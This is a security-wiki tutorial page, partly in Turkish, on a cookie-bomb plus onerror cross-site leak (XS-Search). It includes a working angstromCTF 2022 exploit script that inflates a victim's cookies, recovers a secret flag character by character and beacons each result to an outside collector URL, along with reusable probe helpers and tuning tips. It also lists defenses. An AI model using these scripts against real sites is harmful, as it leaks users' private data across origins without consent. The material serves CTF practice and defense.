# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

This technique combines:
- Cookie bombing: hedef origin için kurbanın tarayıcısını çok/büyük çerezlerle doldurarak sonraki isteklerin sunucu/istek limitlerine takılmasını sağlama (request header size, URL size in redirects, vb.).
- Error-event oracle: bir cross-origin endpoint'i <script> (veya başka bir subresource) ile probe ederek onload vs onerror ile durumları ayırt etme.

Temel fikir
- Test etmek istediğiniz iki durumda farklı davranan bir hedef endpoint bulun (ör. search “hit” vs “miss”).
- “Hit” yolunun ağır bir redirect zinciri veya uzun URL tetikleyeceğinden, “miss” yolunun kısa kalacağından emin olun. Çok sayıda çerez kullanarak request header'ları şişirin, böylece sadece “hit” yolu sunucunun bir HTTP error (ör. 431/414/400) dönmesine sebep olur. Hata onerror tetiklemesini değiştirir ve XS-Search için bir oracle olur.

Ne zaman işe yarar
- Kurban tarayıcının hedefe çerez göndermesini sağlayabiliyorsanız (örn. çerezler SameSite=None veya popup aracılığıyla first-party bağlamında window.open ile ayarlanabiliyorsa).
- Saldırganın keyfi çerezler ayarlamasına izin veren bir uygulama özelliği varsa (örn. kontrol edilen input isim/değerlerini Set-Cookie'ye çeviren “save preference” endpoint'leri) veya post-auth yönlendirmelere saldırgan kontrollü veriyi ekleyebiliyorsanız.
- Sunucu iki durumda farklı tepki veriyor ve şişirilmiş header/URL ile bir durum bir limiti aşıp hata dönerek onerror'ı tetikliyor.

Oracle olarak kullanılan sunucu hatalarına dair not
- 431 Request Header Fields Too Large genellikle çerezlerin request header'ları şişirmesi durumunda döner; uzun hedefler için 414 URI Too Long veya sunucuya özgü bir 400 dönebilir. Bunların herhangi biri subresource yüklemesinin başarısız olmasına ve onerror'ın tetiklenmesine yol açar. [MDN documents 431 and typical causes like excessive cookies.]()

Pratik örnek (angstromCTF 2022)
Aşağıdaki script (kamuya açık bir writeup'tan) saldırganın keyfi çerezler eklemesine izin veren bir özelliği suistimal ediyor, sonra cross-origin search endpoint'ini bir script olarak yüklüyor. Sorgu doğru olduğunda sunucu, çerez şişmesi ile birlikte sunucu limitlerini aşan bir redirect yapıyor ve error status döndürüyor; bu yüzden script.onerror çalışıyor; aksi halde hiçbir şey olmuyor.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Why the popup (window.open)?
- Modern tarayıcılar giderek third‑party cookies'i engelliyor. Hedefe top-level bir pencere açmak çerezleri first‑party yapar; böylece hedefin Set-Cookie yanıtları kalıcı olur ve third‑party cookie kısıtlamaları olsa bile cookie-bomb adımı çalışır.

2024–2025 notes on cookie availability
- Chromium-based tarayıcılar hâlâ kullanıcı veya site opt-out yapmadıkça genellikle third‑party cookies gönderir, ancak Safari ve Firefox varsayılan olarak çoğu third‑party cookies'i engeller. Her iki duruma da hazırlıklı olun: (1) first‑party cookie planting flow kullanın (window.open + auto-submit to a cookie-setting endpoint) ve ardından (2) sadece bu cookie'ler gönderildiğinde başarılı olan bir subresource ile probe edin. Eğer third‑party cookies engelleniyorsa, probe'u same-site bir bağlama taşıyın (örn. popup içinde same-site bir gadget ile oracle'ı çalıştırın ve boolean'ı postMessage veya bir beacon ile sunucunuza exfiltrate edin).

Generic probing helper
If you already have a way to set many cookies on the target origin (first-party), you can reuse this minimal oracle against any endpoint whose success/failure leads to different network outcomes (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Alternatif tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Gelişmiş: de Bruijn–based cookie packing (CTF-proven)
- Uygulama büyük cookie değerlerini kontrol etmenize izin veriyorsa, her probe'a bir de Bruijn dizisi ekleyerek tahminleri verimli şekilde paketleyebilirsiniz. Bu, her probe için ek yükü küçük tutar ve heavy branch'in yalnızca doğru prefix için sürekli olarak daha ağır olmasını sağlar. Uzunluğu n olan |Σ| semboller için örnek generator (fits in a cookie value):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idea in practice: değerleri prefix + deBruijn(k,n) olan birden fazla cookie ayarlayın. Sadece test edilen prefix doğruysa sunucu ağır yolu (ör. uzun cookie veya URL'yi yansıtan ekstra redirect) izler; bu, cookie bloat ile birleşince limitleri aşıp onerror'ı tetikler. Bu yaklaşımı kullanan LA CTF 2024 public solver'a bakın.

Tips to build the oracle
- Pozitif durumu daha ağır yapın: yalnızca predicate doğru olduğunda ekstra bir redirect zincirleyin veya redirect URL'sinin sınırsız kullanıcı girdisini yansıtmasını sağlayın, böylece tahmin edilen prefix ile büyür.
- Başlıkları şişirin: cookie bombing'i, "heavy" yolda tutarlı bir hata gözlenene kadar tekrarlayın. Sunucular genelde header boyutunu sınırlar ve çok sayıda cookie olduğunda daha erken hata verir.
- Kararlı hale getirin: birden fazla paralel cookie set işlemi başlatın ve zamanlama ile önbellek gürültüsünü ortalamak için tekrar tekrar sorgulayın.
- Önbellekleri atlatın ve pooling artefaktlarından kaçının: probe URL'lerine rastgele bir `#fragment` veya `?r=` ekleyin ve window.open döngüleri kullanırken farklı pencere isimlerini tercih edin.
- Alt kaynakları değiştirin: eğer `<script>` filtreleniyorsa `<link rel=stylesheet>` veya `<img>` deneyin. onload/onerror boolean'ı oracle'dır; içerik hiçbir zaman parse edilmesi gerekmez.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs ve sunucular farklı sınırlar uygular. Ekim 2025 itibarıyla Cloudflare kenarda request headers için toplam 128 KB (ve URL için 16 KB) belgeliyor; hedefler bunun arkasındaysa daha fazla/daha büyük cookie gerekebilir. Diğer yığınlar (ör. Apache via LimitRequestFieldSize) genellikle başlık satırı başına ~8 KB civarındadır ve hatalar daha erken meydana gelir. Bomb boyutunu buna göre ayarlayın. [Cloudflare belgeleri 128 KB header sınırını gösterir.]

Related XS-Search tricks
- URL uzunluğuna dayalı oracle'lar (cookie gerektirmez) birleştirilebilir veya çok uzun bir request hedefi zorlayabiliyorsanız onun yerine kullanılabilir:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Defenses and hardening
- Başarı/başarısızlık yanıtlarını ayırt edilemez yapın:
- Koşullu redirect'lerden veya durumlar arasında büyük boyut farklarından kaçının. Durum ne olursa olsun aynı status, aynı content type ve benzer gövde uzunluğu döndürün.
- Cross-site alt-kaynak probe'larını engelleyin:
- SameSite cookies: hassas cookie'leri SameSite=Lax veya Strict yapın ki <script src> gibi alt-kaynak istekleri onları taşımaya; auth token'lar için mümkünse Strict tercih edin.
- Fetch Metadata: cross-site alt-kaynak yüklemelerini reddetmek için bir Resource Isolation Policy uygulayın (ör., Sec-Fetch-Site != same-origin/same-site ise).
- Cross-Origin-Resource-Policy (CORP): cross-origin alt-kaynak olarak embed edilmemesi gereken endpoint'ler için CORP: same-origin (veya en azından same-site) ayarlayın.
- X-Content-Type-Options: nosniff ve JSON/HTML endpoint'lerde doğru Content-Type kullanarak load-as-script tuhaflıklarından kaçının.
- Header/URL amplifikasyonunu azaltın:
- Ayarlanan cookie sayısını/boyutunu sınırlandırın; rastgele form alanlarını Set-Cookie'ye çeviren özellikleri sanitize edin.
- Redirect'lerde yansıtılan veriyi normalize edin veya kırpın; Location URL'lerine saldırgan kontrollü uzun dizeleri gömmekten kaçının.
- Sunucu limitlerini tutarlı tutun ve uniform şekilde başarısız kılın (sadece bir dal için özel hata sayfalarından kaçının).

Notes
- Bu saldırı sınıfı genel olarak “Error Events” XS-Leaks olarak tartışılır. cookie-bomb adımı, yalnızca tek bir dalı sunucu limitlerinin üzerine itmenin kullanışlı bir yoludur ve güvenilir bir boolean oracle üretir.

## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
{{#include ../../banners/hacktricks-training.md}}
